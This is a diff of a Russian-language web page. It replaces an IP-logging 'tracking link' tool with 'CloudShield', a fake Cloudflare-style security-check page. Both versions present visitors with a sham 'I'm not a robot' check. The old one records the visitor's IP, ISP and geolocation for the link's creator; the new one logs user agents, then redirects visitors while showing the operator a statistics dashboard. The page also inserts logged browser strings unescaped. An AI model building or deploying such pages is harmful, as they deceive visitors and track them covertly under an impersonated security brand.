@@ -3,296 +3,422 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Whois по IP + генератор ссылок</title>
+    <title>CloudShield - Генератор защиты</title>
     <style>
-        * { box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background: #f5f5f5; margin: 0; padding: 20px; display: flex; justify-content: center; }
-        .container { max-width: 800px; width: 100%; background: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 20px; }
-        h1, h2 { color: #333; margin-top: 0; }
-        .section { background: #fafafa; border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin-bottom: 20px; }
-        .flex-row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
-        input[type="text"], input[type="url"] { flex: 1; padding: 8px 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; }
-        button { background: #007bff; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-size: 14px; }
-        button:hover { background: #0056b3; }
-        button.secondary { background: #6c757d; }
-        button.secondary:hover { background: #5a6268; }
-        pre { background: #e9ecef; padding: 10px; border-radius: 4px; overflow-x: auto; margin: 10px 0 0; }
-        .result-item { border-bottom: 1px solid #ddd; padding: 10px 0; }
-        .result-item:last-child { border-bottom: none; }
-        .warning { background: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 10px; border-radius: 4px; margin: 10px 0; }
-        .checkbox-label { display: flex; align-items: center; gap: 8px; }
-        .link-box { background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; padding: 10px; border-radius: 4px; word-break: break-all; }
+        :root {
+            --primary: #f38020;
+            --primary-hover: #e67300;
+            --bg: #f5f7fa;
+            --card: #ffffff;
+            --text: #2d3436;
+            --gray: #636e72;
+            --border: #dfe6e9;
+            --success: #00b894;
+            --danger: #d63031;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Навигация */
+        nav {
+            background: #fff;
+            border-bottom: 1px solid var(--border);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            font-weight: bold;
+            font-size: 1.5rem;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .nav-links button {
+            background: none;
+            border: none;
+            padding: 0.5rem 1rem;
+            cursor: pointer;
+            font-weight: 500;
+            color: var(--gray);
+            border-radius: 4px;
+            transition: 0.2s;
+        }
+
+        .nav-links button.active {
+            color: var(--primary);
+            background: rgba(243, 128, 32, 0.1);
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .card {
+            background: var(--card);
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+            padding: 2rem;
+            border: 1px solid var(--border);
+            margin-bottom: 1.5rem;
+        }
+
+        h2 { margin-top: 0; color: var(--text); }
+
+        .form-group { margin-bottom: 1.5rem; }
+        label { display: block; margin-bottom: 0.5rem; font-weight: 500; font-size: 0.9rem; }
+        input, select {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 1rem;
+        }
+
+        button.btn-primary {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.8rem 1.5rem;
+            border-radius: 6px;
+            font-size: 1rem;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            transition: background 0.2s;
+        }
+        button.btn-primary:hover { background: var(--primary-hover); }
+
+        /* Ссылка для захода */
+        .link-box {
+            background: #f1f2f6;
+            padding: 1rem;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 1rem;
+            border: 1px dashed var(--primary);
+        }
+        .link-text {
+            flex-grow: 1;
+            font-family: monospace;
+            font-size: 0.9rem;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .copy-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+
+        /* Verification UI */
+        .verification-container { text-align: center; padding: 3rem 1rem; }
+        .spinner {
+            width: 50px; height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .checkbox-wrapper {
+            border: 1px solid var(--border);
+            padding: 1.5rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            border-radius: 4px;
+            background: #fafafa;
+            cursor: pointer;
+        }
+
+        /* Stats */
+        table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+        th, td { text-align: left; padding: 12px; border-bottom: 1px solid var(--border); }
+        .status-badge { padding: 4px 8px; border-radius: 12px; font-size: 0.75rem; font-weight: bold; }
+        .status-success { background: #e6fffb; color: var(--success); }
+        .status-fail { background: #fff1f0; color: var(--danger); }
+
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 2rem; }
+        .stat-card { background: #f8f9fa; padding: 1.5rem; border-radius: 8px; text-align: center; }
+        .stat-value { font-size: 2rem; font-weight: bold; color: var(--primary); }
+
         .hidden { display: none; }
     </style>
 </head>
 <body>
-<div class="container">
-    <h1>🔍 Whois по IP + генератор ссылок</h1>
 
-    <!-- Whois IP -->
-    <div class="section">
-        <h2>Whois IP</h2>
-        <div class="flex-row">
-            <input type="text" id="ipInput" placeholder="Введите IP (оставьте пустым для своего IP)">
-            <button id="lookupBtn">Поиск</button>
-            <button id="myIpBtn" class="secondary">Мой IP</button>
+    <nav id="main-nav">
+        <div class="logo">CloudShield</div>
+        <div class="nav-links">
+            <button id="nav-gen" class="active" onclick="showSection('gen')">Генератор</button>
+            <button id="nav-stats" onclick="showSection('stats')">Статистика</button>
         </div>
-        <pre id="whoisResult">Введите IP или нажмите "Мой IP"</pre>
-    </div>
+    </nav>
 
-    <!-- Генератор ссылки -->
-    <div class="section">
-        <h2>🔗 Создать отслеживаемую ссылку</h2>
-        <p>После создания вы получите ссылку. Тот, кто перейдёт по ней (с согласием), сохранит свой IP.</p>
-        <button id="generateBtn">Создать ссылку</button>
-        <div id="generatedLinkContainer" class="hidden">
-            <p>Ваша ссылка:</p>
-            <div class="link-box" id="generatedLink"></div>
-            <button id="viewResultsBtn" class="secondary">Просмотреть переходы</button>
+    <div class="container">
+        
+        <!-- Генератор -->
+        <div id="section-gen" class="card">
+            <h2>Создать страницу проверки</h2>
+            <div class="form-group">
+                <label>URL сайта, куда перейдет юзер</label>
+                <input type="url" id="target-url" placeholder="https://example.com" value="https://google.com">
+            </div>
+            <div class="form-group">
+                <label>Тип проверки</label>
+                <select id="verification-type">
+                    <option value="checkbox">Я не робот (клик)</option>
+                    <option value="auto">Автоматически (5 сек)</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Заголовок страницы</label>
+                <input type="text" id="custom-message" value="Проверка безопасности вашего соединения">
+            </div>
+            <button class="btn-primary" onclick="saveSettings()">Создать и получить ссылку</button>
+
+            <div id="generated-link-container" class="hidden">
+                <label style="margin-top: 1.5rem;">Ваша ссылка для распространения:</label>
+                <div class="link-box">
+                    <span class="link-text" id="share-link-display">Загрузка...</span>
+                    <button class="copy-btn" onclick="copyLink()">Копировать</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Страница проверки (Preview Mode) -->
+        <div id="section-preview" class="card hidden">
+            <div class="verification-container" id="verify-box">
+                <h1 id="view-message">Загрузка...</h1>
+                <p style="color: var(--gray)">Пожалуйста, подождите, мы проверяем ваш браузер.</p>
+                <div id="verify-action" style="margin: 30px 0;"></div>
+            </div>
+            <div id="success-box" class="verification-container hidden">
+                <div style="color: var(--success); font-size: 3rem;">✓</div>
+                <h2>Проверка успешно пройдена</h2>
+                <p>Сейчас вы будете перенаправлены...</p>
+            </div>
+        </div>
+
+        <!-- Статистика -->
+        <div id="section-stats" class="card hidden">
+            <h2>Статистика посещений</h2>
+            <div class="stats-grid">
+                <div class="stat-card"><div class="stat-value" id="stat-total">0</div><div>Всего</div></div>
+                <div class="stat-card"><div class="stat-value" id="stat-passed" style="color: var(--success)">0</div><div>Прошли</div></div>
+            </div>
+            <div style="overflow-x: auto;">
+                <table id="logs-table">
+                    <thead>
+                        <tr>
+                            <th>Дата</th>
+                            <th>Браузер</th>
+                            <th>Статус</th>
+                        </tr>
+                    </thead>
+                    <tbody id="logs-body"></tbody>
+                </table>
+            </div>
         </div>
     </div>
 
-    <!-- Просмотр результатов по ID -->
-    <div id="resultsSection" class="section hidden">
-        <h2>📊 Переходы по ссылке</h2>
-        <div id="resultsContent">Загрузка...</div>
-    </div>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, doc, setDoc, getDoc, collection, addDoc, onSnapshot, query } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 
-    <!-- Блок для отслеживаемого перехода (показывается, если в URL есть ?id=...) -->
-    <div id="trackingSection" class="section hidden">
-        <h2>⚠️ are you not a robot</h2>
-        <p>to {{ url }} not a robot</p>
-        <div class="checkbox-label">
-            <input type="checkbox" id="consentCheckbox">
-            <label for="consentCheckbox">click are you not a robot</label>
-        </div>
-        <button id="proceedBtn">next</button>
-        <button id="cancelBtn" class="secondary">cencel</button>
-    </div>
-</div>
+        const firebaseConfig = {
+            apiKey: "AIzaSyDb_xlpLYoVEkd1aObJjzvlS8-JPDjn72E",
+            authDomain: "generalapp-b4f45.firebaseapp.com",
+            databaseURL: "https://generalapp-b4f45-default-rtdb.firebaseio.com",
+            projectId: "generalapp-b4f45",
+            storageBucket: "generalapp-b4f45.firebasestorage.app",
+            messagingSenderId: "800461808673",
+            appId: "1:800461808673:web:ec6374f28c7a40ced7ef60",
+            measurementId: "G-JYL0G1J1GJ"
+        };
 
-<!-- Firebase SDK (v8) -->
-<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const auth = getAuth(app);
+        const appId = "cloudflare-clone-v2";
+        const publicPath = ['artifacts', appId, 'public', 'data'];
 
-<script>
-    // ---------- Firebase инициализация ----------
-    const firebaseConfig = {
-        apiKey: "AIzaSyDb_xlpLYoVEkd1aObJjzvlS8-JPDjn72E",
-        authDomain: "generalapp-b4f45.firebaseapp.com",
-        databaseURL: "https://generalapp-b4f45-default-rtdb.firebaseio.com",
-        projectId: "generalapp-b4f45",
-        storageBucket: "generalapp-b4f45.firebasestorage.app",
-        messagingSenderId: "800461808673",
-        appId: "1:800461808673:web:ec6374f28c7a40ced7ef60",
-        measurementId: "G-JYL0G1J1GJ"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+        let currentUser = null;
 
-    // ---------- Утилиты ----------
-    const urlParams = new URLSearchParams(window.location.search);
-    const trackingId = urlParams.get('id');      // для перехода
-    const viewId = urlParams.get('view');        // для просмотра результатов
+        // Инициализация
+        window.onload = async () => {
+            await signInAnonymously(auth);
+            
+            // Проверяем, зашел ли пользователь по специальной ссылке
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('view')) {
+                showSection('preview');
+                document.getElementById('main-nav').classList.add('hidden');
+            }
+        };
 
-    // Функция получения информации по IP через ip-api.com
-    async function getIPInfo(ip = '') {
-        const url = ip ? `https://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,org,as,lat,lon,query` : 'https://ip-api.com/json/?fields=status,message,country,regionName,city,isp,org,as,lat,lon,query';
-        try {
-            const response = await fetch(url);
-            const data = await response.json();
-            if (data.status === 'success') {
-                return data;
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                currentUser = user;
+                loadSettings();
+                listenToLogs();
+            }
+        });
+
+        // Сохранение и генерация ссылки
+        window.saveSettings = async () => {
+            const settings = {
+                url: document.getElementById('target-url').value,
+                type: document.getElementById('verification-type').value,
+                message: document.getElementById('custom-message').value,
+                createdAt: new Date().toISOString()
+            };
+
+            try {
+                await setDoc(doc(db, ...publicPath, 'settings', 'current'), settings);
+                
+                // Генерируем ссылку
+                const currentUrl = window.location.href.split('?')[0];
+                const shareLink = `${currentUrl}?view=true`;
+                
+                document.getElementById('share-link-display').innerText = shareLink;
+                document.getElementById('generated-link-container').classList.remove('hidden');
+                alert("Настройки обновлены!");
+            } catch (e) { console.error(e); }
+        };
+
+        async function loadSettings() {
+            const snap = await getDoc(doc(db, ...publicPath, 'settings', 'current'));
+            if (snap.exists()) {
+                const data = snap.data();
+                document.getElementById('target-url').value = data.url;
+                document.getElementById('verification-type').value = data.type;
+                document.getElementById('custom-message').value = data.message;
+                
+                if (window.location.search.includes('view')) {
+                    startVerification(data);
+                }
+            }
+        }
+
+        function startVerification(settings) {
+            const actionBox = document.getElementById('verify-action');
+            document.getElementById('view-message').innerText = settings.message;
+            actionBox.innerHTML = '';
+
+            logActivity('Начало проверки', 'pending');
+
+            if (settings.type === 'auto') {
+                actionBox.innerHTML = '<div class="spinner"></div>';
+                setTimeout(() => finish(true), 4000);
             } else {
-                throw new Error(data.message || 'Не удалось получить информацию');
-            }
-        } catch (error) {
-            throw new Error('Ошибка запроса: ' + error.message);
-        }
-    }
-
-    // Функция получения текущего IP через ipify
-    async function getMyIP() {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip;
-    }
-
-    // Отображение информации об IP в блоке whois
-    function displayWhoisData(data) {
-        if (!data) return;
-        const lines = [
-            `IP: ${data.query}`,
-            `Страна: ${data.country}`,
-            `Регион: ${data.regionName}`,
-            `Город: ${data.city}`,
-            `Провайдер: ${data.isp}`,
-            `Организация: ${data.org}`,
-            `AS: ${data.as}`,
-            `Координаты: ${data.lat}, ${data.lon}`
-        ];
-        document.getElementById('whoisResult').textContent = lines.join('\n');
-    }
-
-    // ---------- Работа с Firebase ----------
-    async function createTrackingLink() {
-        // Генерируем случайный ID (6 символов)
-        const id = Math.random().toString(36).substring(2, 8);
-        // Получаем IP создателя
-        let creatorIp = 'не определен';
-        try {
-            creatorIp = await getMyIP();
-        } catch (e) { console.warn('Не удалось определить IP создателя'); }
-
-        const linkData = {
-            createdAt: firebase.database.ServerValue.TIMESTAMP,
-            creatorIp: creatorIp,
-            hits: [] // массив объектов { ip, country, region, city, isp, org, as, lat, lon, timestamp }
-        };
-
-        await db.ref('trackingLinks/' + id).set(linkData);
-        return id;
-    }
-
-    async function recordHit(linkId, ipInfo) {
-        const hit = {
-            ip: ipInfo.query,
-            country: ipInfo.country,
-            region: ipInfo.regionName,
-            city: ipInfo.city,
-            isp: ipInfo.isp,
-            org: ipInfo.org,
-            as: ipInfo.as,
-            lat: ipInfo.lat,
-            lon: ipInfo.lon,
-            timestamp: firebase.database.ServerValue.TIMESTAMP
-        };
-
-        // Добавляем в массив hits
-        const ref = db.ref('trackingLinks/' + linkId + '/hits');
-        await ref.push(hit);
-    }
-
-    async function getLinkData(linkId) {
-        const snapshot = await db.ref('trackingLinks/' + linkId).once('value');
-        return snapshot.val();
-    }
-
-    // ---------- UI обработчики ----------
-    document.addEventListener('DOMContentLoaded', async () => {
-        // 1. Если есть trackingId (переход по ссылке) – показываем секцию согласия
-        if (trackingId) {
-            document.getElementById('trackingSection').classList.remove('hidden');
-            // Скрываем другие секции для ясности
-            document.querySelectorAll('.section:not(#trackingSection)').forEach(el => el.classList.add('hidden'));
-        }
-        // 2. Если есть viewId – показываем результаты
-        else if (viewId) {
-            document.getElementById('resultsSection').classList.remove('hidden');
-            await loadAndDisplayResults(viewId);
-        }
-
-        // Whois по введённому IP
-        document.getElementById('lookupBtn').addEventListener('click', async () => {
-            const ip = document.getElementById('ipInput').value.trim();
-            try {
-                const data = await getIPInfo(ip || undefined);
-                displayWhoisData(data);
-            } catch (e) {
-                document.getElementById('whoisResult').textContent = 'Ошибка: ' + e.message;
-            }
-        });
-
-        // Мой IP
-        document.getElementById('myIpBtn').addEventListener('click', async () => {
-            try {
-                const ip = await getMyIP();
-                document.getElementById('ipInput').value = ip;
-                const data = await getIPInfo(ip);
-                displayWhoisData(data);
-            } catch (e) {
-                document.getElementById('whoisResult').textContent = 'Ошибка: ' + e.message;
-            }
-        });
-
-        // Генерация ссылки
-        document.getElementById('generateBtn').addEventListener('click', async () => {
-            try {
-                const id = await createTrackingLink();
-                const link = `${window.location.origin}${window.location.pathname}?id=${id}`;
-                document.getElementById('generatedLink').textContent = link;
-                document.getElementById('generatedLinkContainer').classList.remove('hidden');
-                // Кнопка просмотра результатов
-                document.getElementById('viewResultsBtn').onclick = () => {
-                    window.location.href = `?view=${id}`;
+                const btn = document.createElement('div');
+                btn.className = 'checkbox-wrapper';
+                btn.innerHTML = '<div style="width:20px;height:20px;border:1px solid #ccc;background:#fff"></div> <span>Я не робот</span>';
+                btn.onclick = () => {
+                    btn.innerHTML = '<span style="color:green">✓</span> <span>Проверено</span>';
+                    finish(true);
                 };
-            } catch (e) {
-                alert('Ошибка создания ссылки: ' + e.message);
+                actionBox.appendChild(btn);
             }
-        });
-
-        // Обработка согласия на отслеживание
-        document.getElementById('proceedBtn').addEventListener('click', async () => {
-            if (!document.getElementById('consentCheckbox').checked) {
-                alert('Необходимо дать согласие на сбор данных.');
-                return;
-            }
-
-            try {
-                // Получаем IP и информацию о посетителе
-                const myIp = await getMyIP();
-                const ipInfo = await getIPInfo(myIp);
-                // Сохраняем в Firebase
-                await recordHit(trackingId, ipInfo);
-                alert('Данные сохранены. Спасибо!');
-                // Перенаправляем на просмотр (или просто показываем сообщение)
-                window.location.href = `?view=${trackingId}`;
-            } catch (e) {
-                alert('Ошибка при сохранении: ' + e.message);
-            }
-        });
-
-        document.getElementById('cancelBtn').addEventListener('click', () => {
-            window.location.href = '/'; // на главную
-        });
-    });
-
-    // Функция загрузки и отображения результатов
-    async function loadAndDisplayResults(id) {
-        const contentDiv = document.getElementById('resultsContent');
-        try {
-            const data = await getLinkData(id);
-            if (!data) {
-                contentDiv.innerHTML = '<p>Ссылка не найдена.</p>';
-                return;
-            }
-
-            let html = `<p><strong>Создатель IP:</strong> ${data.creatorIp || 'неизвестно'}</p>`;
-            html += `<p><strong>Дата создания:</strong> ${new Date(data.createdAt).toLocaleString()}</p>`;
-            html += `<h3>Переходы (${data.hits ? Object.keys(data.hits).length : 0})</h3>`;
-
-            if (data.hits) {
-                const hitsArray = Object.values(data.hits);
-                hitsArray.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-                hitsArray.forEach((hit, index) => {
-                    html += `<div class="result-item">`;
-                    html += `<strong>#${index + 1}</strong> — ${new Date(hit.timestamp).toLocaleString()}<br>`;
-                    html += `IP: ${hit.ip}<br>`;
-                    html += `📍 ${hit.country}, ${hit.region}, ${hit.city}<br>`;
-                    html += `🏢 ${hit.isp} (${hit.org})<br>`;
-                    html += `📡 AS: ${hit.as}<br>`;
-                    html += `🌐 Координаты: ${hit.lat}, ${hit.lon}`;
-                    html += `</div>`;
-                });
-            } else {
-                html += '<p>Пока нет переходов.</p>';
-            }
-
-            contentDiv.innerHTML = html;
-        } catch (e) {
-            contentDiv.innerHTML = '<p>Ошибка загрузки: ' + e.message + '</p>';
         }
-    }
-</script>
+
+        async function finish(success) {
+            if (success) {
+                await logActivity('Успешный проход', 'passed');
+                document.getElementById('verify-box').classList.add('hidden');
+                document.getElementById('success-box').classList.remove('hidden');
+                
+                const url = document.getElementById('target-url').value;
+                setTimeout(() => {
+                    window.parent.postMessage({ type: 'redirect', url: url }, '*');
+                    console.log("Redirecting to: " + url);
+                }, 1500);
+            }
+        }
+
+        async function logActivity(action, status) {
+            if (!currentUser) return;
+            await addDoc(collection(db, ...publicPath, 'logs'), {
+                timestamp: new Date().toISOString(),
+                status: status,
+                ua: navigator.userAgent.split(') ')[1] || 'Unknown Browser'
+            });
+        }
+
+        function listenToLogs() {
+            onSnapshot(collection(db, ...publicPath, 'logs'), (snap) => {
+                const body = document.getElementById('logs-body');
+                body.innerHTML = '';
+                let passed = 0;
+                
+                const sorted = [...snap.docs].sort((a,b) => new Date(b.data().timestamp) - new Date(a.data().timestamp));
+                
+                sorted.forEach(d => {
+                    const data = d.data();
+                    if (data.status === 'passed') passed++;
+                    body.insertAdjacentHTML('beforeend', `
+                        <tr>
+                            <td>${new Date(data.timestamp).toLocaleTimeString()}</td>
+                            <td>${data.ua}</td>
+                            <td><span class="status-badge ${data.status === 'passed' ? 'status-success' : 'status-fail'}">${data.status}</span></td>
+                        </tr>
+                    `);
+                });
+                document.getElementById('stat-total').innerText = snap.size;
+                document.getElementById('stat-passed').innerText = passed;
+            });
+        }
+
+        window.copyLink = () => {
+            const text = document.getElementById('share-link-display').innerText;
+            const el = document.createElement('textarea');
+            el.value = text;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
+            alert("Ссылка скопирована!");
+        };
+
+        window.showSection = (id) => {
+            document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
+            document.getElementById('section-' + id).classList.remove('hidden');
+            document.querySelectorAll('.nav-links button').forEach(b => b.classList.remove('active'));
+            document.getElementById('nav-' + id).classList.add('active');
+        };
+    </script>
 </body>
 </html>
